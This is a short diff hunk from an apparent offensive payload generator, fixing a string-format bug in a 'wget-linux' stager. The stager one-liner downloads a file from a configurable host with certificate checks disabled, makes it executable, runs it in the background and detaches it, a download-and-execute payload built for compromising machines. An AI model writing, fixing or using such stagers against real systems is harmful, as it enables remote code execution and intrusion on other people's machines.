@@ -68,9 +68,7 @@ def generate_payload(lang, host, port, uri):
 
     if lang == "wget-linux":
         random_str = randomize_str()
-        one_liner = "wget -qO {rand_str} --no-check-certificate http://{host}:{port}/{uri}; chmod +x {random_str}; ./{" \
-                    "random_str}& disown".format(
-            random_str=random_str, host=srv_host, port=srv_port, uri=srv_uri)
+        one_liner = "wget -qO {random_str} --no-check-certificate http://{host}:{port}/{uri}; chmod +x {random_str}; ./{random_str}& disown".format(random_str=random_str, host=srv_host, port=srv_port, uri=srv_uri)
 
     if lang == "wget-psh":
         random_str = randomize_str()
